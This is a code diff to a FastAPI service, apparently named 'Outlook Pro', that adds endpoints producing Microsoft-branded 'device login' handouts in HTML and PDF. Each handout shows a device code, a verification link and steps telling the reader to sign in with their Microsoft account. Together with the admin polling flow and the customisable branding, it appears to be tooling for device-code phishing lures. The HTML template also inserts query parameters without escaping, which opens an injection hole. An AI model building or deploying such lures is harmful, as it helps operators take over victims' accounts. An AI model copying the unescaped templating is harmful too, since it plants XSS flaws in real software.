@@ -1,9 +1,13 @@
 from fastapi import FastAPI, Request, Depends, HTTPException, status
-from fastapi.responses import RedirectResponse, JSONResponse
+from fastapi.responses import RedirectResponse, JSONResponse, HTMLResponse, StreamingResponse
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 from jose import jwt, JWTError
 from datetime import datetime, timedelta
+from io import BytesIO
+from reportlab.lib.pagesizes import A4
+from reportlab.lib.units import mm
+from reportlab.pdfgen import canvas
 import logging
 import os
 
@@ -95,13 +99,263 @@ def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
         raise HTTPException(status_code=401, detail="Invalid or expired token")
 
 
-def resolve_user_id(user_id: str | None, user):
-    return user_id or user["sub"]
-
-
 def ensure_write_allowed():
     if READ_ONLY_MODE:
         raise HTTPException(status_code=403, detail="Read-only mode enabled")
+
+
+# =========================
+# PDF / HTML HELPERS
+# =========================
+def split_text_for_pdf(text: str, max_chars: int = 90):
+    words = (text or "").split()
+    lines = []
+    current = ""
+
+    for word in words:
+        test = f"{current} {word}".strip()
+        if len(test) <= max_chars:
+            current = test
+        else:
+            if current:
+                lines.append(current)
+            current = word
+
+    if current:
+        lines.append(current)
+
+    return lines or [""]
+
+
+def build_device_handout_html(
+    title: str,
+    brief_writeup: str,
+    verification_uri: str,
+    user_code: str,
+    logo_url: str = "",
+):
+    safe_title = title or "Microsoft Device Login"
+    safe_writeup = brief_writeup or "Use the Microsoft link below and enter the code to complete sign-in."
+    safe_logo = logo_url or ""
+    safe_verification_uri = verification_uri or "https://microsoft.com/devicelogin"
+    safe_user_code = user_code or "N/A"
+
+    logo_html = ""
+    if safe_logo.strip():
+        logo_html = f'''
+        <div style="margin-bottom: 20px;">
+            <img src="{safe_logo}" alt="Logo" style="max-height: 70px; max-width: 220px;" />
+        </div>
+        '''
+    else:
+        logo_html = '''
+        <div style="margin-bottom: 20px; padding: 16px; border: 2px dashed #bbb; border-radius: 8px; color: #666;">
+            Logo goes here
+        </div>
+        '''
+
+    return f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="utf-8"/>
+        <title>{safe_title}</title>
+        <style>
+            body {{
+                font-family: Arial, sans-serif;
+                background: #f5f7fb;
+                margin: 0;
+                padding: 30px;
+                color: #1f2937;
+            }}
+            .card {{
+                max-width: 760px;
+                margin: 0 auto;
+                background: #ffffff;
+                border-radius: 12px;
+                padding: 32px;
+                box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+                border: 1px solid #e5e7eb;
+            }}
+            .badge {{
+                display: inline-block;
+                background: #eef6ff;
+                color: #0b63c7;
+                border: 1px solid #b9d7ff;
+                border-radius: 999px;
+                padding: 6px 12px;
+                font-size: 12px;
+                font-weight: bold;
+                margin-bottom: 18px;
+            }}
+            .title {{
+                font-size: 30px;
+                font-weight: bold;
+                margin-bottom: 12px;
+            }}
+            .writeup {{
+                font-size: 16px;
+                line-height: 1.6;
+                margin-bottom: 24px;
+                color: #374151;
+            }}
+            .section {{
+                margin-bottom: 24px;
+                padding: 18px;
+                border: 1px solid #e5e7eb;
+                border-radius: 10px;
+                background: #fafafa;
+            }}
+            .label {{
+                font-size: 13px;
+                color: #6b7280;
+                margin-bottom: 8px;
+            }}
+            .link {{
+                font-size: 18px;
+                font-weight: bold;
+                word-break: break-word;
+            }}
+            .code {{
+                font-size: 34px;
+                font-weight: 800;
+                letter-spacing: 3px;
+                color: #0b63c7;
+            }}
+            .steps li {{
+                margin-bottom: 8px;
+            }}
+            .footer {{
+                margin-top: 28px;
+                font-size: 12px;
+                color: #6b7280;
+            }}
+        </style>
+    </head>
+    <body>
+        <div class="card">
+            {logo_html}
+            <div class="badge">Microsoft Device Login</div>
+            <div class="title">{safe_title}</div>
+            <div class="writeup">{safe_writeup}</div>
+
+            <div class="section">
+                <div class="label">Open this Microsoft page</div>
+                <div class="link">
+                    <a href="{safe_verification_uri}" target="_blank">{safe_verification_uri}</a>
+                </div>
+            </div>
+
+            <div class="section">
+                <div class="label">Enter this code</div>
+                <div class="code">{safe_user_code}</div>
+            </div>
+
+            <div class="section">
+                <div class="label">Steps</div>
+                <ol class="steps">
+                    <li>Open the Microsoft link above.</li>
+                    <li>Enter the device code shown in this document.</li>
+                    <li>Sign in with your Microsoft account.</li>
+                    <li>Return to the admin dashboard after sign-in is complete.</li>
+                </ol>
+            </div>
+
+            <div class="footer">
+                Generated by Outlook Pro.
+            </div>
+        </div>
+    </body>
+    </html>
+    """
+
+
+def build_device_handout_pdf(
+    title: str,
+    brief_writeup: str,
+    verification_uri: str,
+    user_code: str,
+    logo_url: str = "",
+):
+    buffer = BytesIO()
+    pdf = canvas.Canvas(buffer, pagesize=A4)
+    width, height = A4
+
+    x = 20 * mm
+    y = height - 25 * mm
+
+    pdf.setFont("Helvetica-Bold", 22)
+    pdf.drawString(x, y, title or "Microsoft Device Login")
+    y -= 12 * mm
+
+    pdf.setFont("Helvetica", 11)
+    pdf.drawString(x, y, "Logo area:")
+    y -= 6 * mm
+
+    if logo_url and logo_url.strip():
+        pdf.setFont("Helvetica-Oblique", 10)
+        pdf.drawString(x, y, f"Logo URL: {logo_url}")
+        y -= 10 * mm
+    else:
+        pdf.rect(x, y - 20 * mm, 60 * mm, 20 * mm)
+        pdf.setFont("Helvetica", 10)
+        pdf.drawString(x + 5 * mm, y - 10 * mm, "Logo goes here")
+        y -= 28 * mm
+
+    pdf.setFont("Helvetica-Bold", 13)
+    pdf.drawString(x, y, "Brief write-up")
+    y -= 7 * mm
+
+    pdf.setFont("Helvetica", 11)
+    writeup = brief_writeup or "Use the Microsoft link below and enter the code to complete sign-in."
+    for line in split_text_for_pdf(writeup, 90):
+        pdf.drawString(x, y, line)
+        y -= 6 * mm
+
+    y -= 4 * mm
+
+    pdf.setFont("Helvetica-Bold", 13)
+    pdf.drawString(x, y, "Microsoft link")
+    y -= 7 * mm
+
+    pdf.setFont("Helvetica", 11)
+    for line in split_text_for_pdf(verification_uri or "https://microsoft.com/devicelogin", 90):
+        pdf.drawString(x, y, line)
+        y -= 6 * mm
+
+    y -= 4 * mm
+
+    pdf.setFont("Helvetica-Bold", 13)
+    pdf.drawString(x, y, "Device code")
+    y -= 10 * mm
+
+    pdf.setFont("Helvetica-Bold", 24)
+    pdf.drawString(x, y, user_code or "N/A")
+    y -= 16 * mm
+
+    pdf.setFont("Helvetica-Bold", 13)
+    pdf.drawString(x, y, "Steps")
+    y -= 8 * mm
+
+    pdf.setFont("Helvetica", 11)
+    steps = [
+        "1. Open the Microsoft link above.",
+        "2. Enter the device code shown in this document.",
+        "3. Sign in with your Microsoft account.",
+        "4. Return to the admin dashboard after sign-in is complete."
+    ]
+    for step in steps:
+        pdf.drawString(x, y, step)
+        y -= 7 * mm
+
+    y -= 8 * mm
+    pdf.setFont("Helvetica-Oblique", 10)
+    pdf.drawString(x, y, "Generated by Outlook Pro.")
+
+    pdf.showPage()
+    pdf.save()
+    buffer.seek(0)
+    return buffer
 
 
 # =========================
@@ -197,6 +451,62 @@ async def device_poll(request: Request, user=Depends(verify_token)):
         admin_user_id=user["sub"],
         client_ip=request.client.host if request.client else None,
         user_agent=request.headers.get("user-agent")
+    )
+
+
+@app.get("/device-code/handout/html")
+def device_handout_html(
+    user_code: str,
+    verification_uri: str,
+    title: str = "Microsoft Device Login",
+    brief_writeup: str = "",
+    logo_url: str = "",
+    download: int = 0,
+    user=Depends(verify_token)
+):
+    html = build_device_handout_html(
+        title=title,
+        brief_writeup=brief_writeup,
+        verification_uri=verification_uri,
+        user_code=user_code,
+        logo_url=logo_url
+    )
+
+    headers = {}
+    if download == 1:
+        headers["Content-Disposition"] = 'attachment; filename="device-login-handout.html"'
+    else:
+        headers["Content-Disposition"] = 'inline; filename="device-login-handout.html"'
+
+    return HTMLResponse(content=html, headers=headers)
+
+
+@app.get("/device-code/handout/pdf")
+def device_handout_pdf(
+    user_code: str,
+    verification_uri: str,
+    title: str = "Microsoft Device Login",
+    brief_writeup: str = "",
+    logo_url: str = "",
+    download: int = 0,
+    user=Depends(verify_token)
+):
+    pdf_buffer = build_device_handout_pdf(
+        title=title,
+        brief_writeup=brief_writeup,
+        verification_uri=verification_uri,
+        user_code=user_code,
+        logo_url=logo_url
+    )
+
+    disposition = "attachment" if download == 1 else "inline"
+
+    return StreamingResponse(
+        pdf_buffer,
+        media_type="application/pdf",
+        headers={
+            "Content-Disposition": f'{disposition}; filename="device-login-handout.pdf"'
+        }
     )
 
 
